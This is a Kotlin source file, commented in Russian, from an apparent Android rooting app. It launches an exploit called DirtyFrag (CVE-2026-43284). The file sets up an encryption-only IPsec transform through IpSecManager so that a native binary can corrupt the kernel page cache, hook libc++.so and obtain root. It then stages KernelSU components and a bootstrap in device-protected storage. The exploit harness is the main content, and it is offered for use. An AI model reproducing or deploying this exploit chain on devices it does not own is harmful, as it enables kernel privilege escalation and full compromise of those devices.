package com.rootmyvivo.root

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import java.io.File
import java.security.SecureRandom
import java.nio.file.Files
import java.nio.file.StandardCopyOption
import java.net.DatagramSocket
import java.net.InetAddress

/**
 * Запуск DirtyFrag (CVE-2026-43284) — универсальный механизм, встроенный в APK:
 * нативная libdfroot.so сама выбирает ko по KMI из uname, патчит page cache
 * через ESP-CBC (in-place), ставит хук в libc++.so и триггерит root-контекст.
 *
 * Java-сторона: IpSecManager SA только CRYPT_AES_CBC (encryption-only —
 * форма DFRoot V3.0: без ICV-проверки ядро расшифровывает безусловно;
 * HMAC-вариант давал промах по ICV и page cache не менялся), стейджинг
 * ksud/bootstrap/df.conf в device-protected папку (путь зашит в
 * lkm/dfroot.c), запуск натива.
 *
 * Выбор менеджера — как в оригинальном DFRoot (SettingsFragment → su_manager),
 * только источник — вариант, выбранный пользователем на главной ([variant]),
 * а не первый установленный из захардкоженного списка. ksud берётся ЭТОГО
 * менеджера: установленный пакет → распаковка libksud.so из стейдженного
 * manager.apk → assets/ksud (фолбэк, оригинальный KernelSU). df.conf
 * `su_manager` = фактический пакет APK (spoofed-сборки подписи под рандомным
 * именем) — бутстрап авторизует именно его при ksud late-load.
 */
class DirtyFragRunner(private val variant: KsuVariant) {

    /** Живой процесс натива — для полной остановки по кнопке. */
    @Volatile private var proc: Process? = null

    /** Полная остановка: убить натив DirtyFrag. Страница-кэш патчи,
     *  не дошедшие до cleanup, живут до перезагрузки — как у GL-стопа. */
    fun cancel() {
        try {
            proc?.destroy()
        } catch (_: Exception) {
        }
    }

    private companion object {
        const val NATIVE_BIN = "libdfroot.so"
    }

    /** Пакет менеджера, под который стейджнуты ksud/df.conf. */
    var suManager: String = variant.packageName
        private set

    /** device-protected контекст: ko/бутстрап читают наши файлы до разблокировки. */
    private fun dpCtx(ctx: Context): Context = ctx.createDeviceProtectedStorageContext()

    private fun dpDir(ctx: Context): File = dpCtx(ctx).filesDir.parentFile!!

    private fun stageBin(ctx: Context, src: File, name: String) {
        if (!src.exists()) throw java.io.IOException("$src not found")
        val dest = File(dpDir(ctx), name)
        Files.copy(src.toPath(), dest.toPath(), StandardCopyOption.REPLACE_EXISTING)
        if (!dest.setExecutable(true, false))
            throw java.io.IOException("setExecutable failed: ${dest.absolutePath}")
    }

    /**
     * Стейджинг: ksud (из выбранного менеджера), bootstrap и df.conf —
     * в /data/user_de/0/<pkg>/. Вызывать и до разблокировки (BootReceiver)
     * — directBootAware. Идемпотентен: run() перестейдживает после
     * stageManagerApkForDf — так df.conf читает уже скачанный APK.
     */
    fun stage(ctx: Context) {
        val dp = dpDir(ctx)
        dp.mkdirs()

        // APK менеджера, докачанный до запуска эксплойта (если вообще
        // качался — при уже установленном менеджере скачивания нет).
        // Фактический пакет читаем из архива: spoofed-сборка подписана под
        // рандомным именем. Сайдкар manager.apk.variant не даёт
        // переиспользовать APK другого варианта, оставшийся от прошлого
        // выбора на главной
        val apk = File(dp, "manager.apk")
        val sidecar = File(dp, "manager.apk.variant")
        if (apk.exists() && (sidecar.exists() && sidecar.readText().trim() != variant.id)) {
            apk.delete()
            sidecar.delete()
        }
        val actualPkg = if (apk.exists() && apk.length() > 1_000_000) {
            try {
                ctx.packageManager.getPackageArchiveInfo(apk.absolutePath, 0)?.packageName
            } catch (_: Exception) {
                null
            }
        } else null
        // Пакет прошлой установки ЭТОГО варианта — фактическое имя spoofed
        // менеджера, уже стоящего в системе (записано KsuInstaller'ом);
        // кастомный менеджер из скана (libksud) — приоритетнее варианта
        val prefs = com.rootmyvivo.data.Prefs(ctx)
        val customPkg = prefs.customManagerPkg
        val savedPkg = if (prefs.managerVariant == variant.id) prefs.managerPackage else ""
        val pkg = actualPkg ?: customPkg.ifEmpty { savedPkg.ifEmpty { variant.packageName } }
        suManager = pkg

        // ksud приоритетом: 1) nativeLibraryDir установленного пакета —
        // мгновенно, без распаковки (extractNativeLibs=true); 2) DEFLATE-распайп
        // libksud.so из base.apk установленного пакета; 3) из стейдженного
        // manager.apk; 4) assets/ksud — фолбэк для пустой установки
        var ksudStaged = false
        for (p in listOf(pkg, customPkg, savedPkg, variant.packageName).filter { it.isNotEmpty() }.distinct()) {
            try {
                val info = ctx.packageManager.getApplicationInfo(p, 0)
                val lib = File(info.nativeLibraryDir, "libksud.so")
                if (lib.isFile && lib.length() > 0) {
                    stageBin(ctx, lib, "ksud")
                    ksudStaged = true
                    break
                }
                if (info.sourceDir != null && stageKsudFromApk(File(info.sourceDir), File(dp, "ksud"))) {
                    ksudStaged = true
                    break
                }
            } catch (_: Exception) {
            }
        }
        if (!ksudStaged && apk.exists()) ksudStaged = stageKsudFromApk(apk, File(dp, "ksud"))
        if (!ksudStaged) {
            val tmp = File(dpCtx(ctx).filesDir, "ksud_asset")
            Files.copy(
                dpCtx(ctx).assets.open("ksud").use { it.readBytes() }.inputStream(),
                tmp.toPath(),
                StandardCopyOption.REPLACE_EXISTING,
            )
            stageBin(ctx, tmp, "ksud")
            tmp.delete()
        }

        val nativeDir = ctx.applicationInfo.nativeLibraryDir
        stageBin(ctx, File(nativeDir, "libbootstrap.so"), "bootstrap")

        // df.conf для бутстрапа (key=value; disable_modules по умолчанию выключен —
        // модули пользователя не трогаем). su_manager — пакет ИМЕННО того
        // менеджера, чей ksud стейджнут, — late-load авторизует его, а не
        // захардкоженный me.weishu.kernelsu
        val conf = buildString {
            append("su_manager=").append(pkg).append('\n')
            // Авто-софт-ребут как «auto reboot» в DirtyFrag: бутстрап сам
            // выполнит `ksud soft-reboot` из root-контекста после late-load
            append("soft_reboot=").append(if (prefs.settings().softRebootAuto) "1" else "0").append('\n')
            append("disable_modules=0\n")
        }
        File(dp, "df.conf").writeText(conf)
    }

    /** libksud из base.apk менеджера → dest; true если извлечён.
     *  ZipFile читает центральный каталог (random access) — ZipInputStream
     *  сканировал весь APK последовательно: на 100-МБ APK менеджера это
     *  секунды «между ksud и бутстрап подготовлены». Для рандомизированных
     *  ksud (SukiSU Nova) проверяем кандидатов по размеру и валидируем
     *  `--version`. */
    private fun stageKsudFromApk(apk: File, dest: File): Boolean {
        if (!apk.isFile || apk.length() < 1_000_000) return false
        return try {
            java.util.zip.ZipFile(apk).use { zf ->
                // Канонический путь: точное имя записи
                val direct = listOf("lib/arm64-v8a/libksud.so", "lib/arm64/libksud.so")
                    .mapNotNull { zf.getEntry(it) }
                    .firstOrNull()
                if (direct != null) {
                    zf.getInputStream(direct).use { ins ->
                        dest.outputStream().use { ins.copyTo(it) }
                    }
                    return dest.length() > 0 && dest.setExecutable(true, false)
                }
                // Рандомизированный ksud: крупные lib-записи в окне размеров,
                // каждая — на пробу; подходящую оставляем в dest
                val cands = zf.entries().asSequence()
                    .filter { e ->
                        !e.isDirectory && e.name.startsWith("lib/arm64-v8a/") &&
                            e.name.endsWith(".so") && e.size in 2_000_000..25_000_000
                    }
                    .toList()
                val tmp = File(dest.parentFile, "ksud_probe")
                for (e in cands) {
                    runCatching {
                        zf.getInputStream(e).use { ins ->
                            tmp.outputStream().use { ins.copyTo(it) }
                        }
                        if (!tmp.setExecutable(true, false)) return@runCatching
                        val p = ProcessBuilder(tmp.absolutePath, "--version")
                            .redirectErrorStream(true)
                            // stdin из /dev/null: часть .so, запущенных как
                            // программы, висла на чтении ввода — по 3с на кандидата
                            .redirectInput(ProcessBuilder.Redirect.from(File("/dev/null")))
                            .start()
                        var out = ""
                        val t = Thread {
                            runCatching { out = p.inputStream.bufferedReader().readText() }
                        }.apply { isDaemon = true; start() }
                        if (!p.waitFor(1500, java.util.concurrent.TimeUnit.MILLISECONDS)) {
                            p.destroy()
                        } else if (out.contains("KernelSU", true) || out.contains("uapi") ||
                            out.contains("late-load")
                        ) {
                            tmp.renameTo(dest)
                            dest.setExecutable(true, false)
                            return true
                        }
                    }
                    tmp.delete()
                }
                false
            }
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Полный запуск: SA (IpSecManager) → нативный бинарь. Стейджинг ВЫЗЫВАЮЩИЙ
     * делает заранее ([stage]) — подготовка обязана быть завершена до запуска
     * натива, здесь она не повторяется (иначе эксплойт стартует раньше, чем
     * готовы ksud/df.conf, и вторым проходом тратятся секунды на перепись).
     * Возвращает код выхода. Кидает исключение при любой ошибке setup.
     */
    fun run(ctx: Context, onLine: (String) -> Unit): Int {
        val ipsec = ctx.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
            ?: throw IllegalStateException("IpSecManager unavailable (requires API 28+)")

        val encapSock = ipsec.openUdpEncapsulationSocket()
        val loopback = InetAddress.getByName("127.0.0.1")
        val spiObj = ipsec.allocateSecurityParameterIndex(loopback)

        val rnd = SecureRandom()
        val aesKey = ByteArray(32).also(rnd::nextBytes)

        // sender port: pick-then-release эфемерный
        val senderSock = DatagramSocket()
        val senderPort = senderSock.localPort
        senderSock.close()

        val transform = IpSecTransform.Builder(ctx)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spiObj)

        try {
            val bin = File(ctx.applicationInfo.nativeLibraryDir, NATIVE_BIN)
            val cmd = listOf(
                bin.absolutePath,
                "--encap-port", encapSock.port.toString(),
                "--sender-port", senderPort.toString(),
                "--spi", Integer.toUnsignedString(spiObj.spi),
                "--aes-key", hex(aesKey),
            )
            val pb = ProcessBuilder(cmd)
            pb.redirectErrorStream(true)
            val p = pb.start()
            proc = p
            p.inputStream.bufferedReader().forEachLine { onLine(it) }
            return p.waitFor()
        } finally {
            transform.close()
            spiObj.close()
            encapSock.close()
        }
    }

    private fun hex(b: ByteArray): String = b.joinToString("") { String.format("%02x", it) }
}
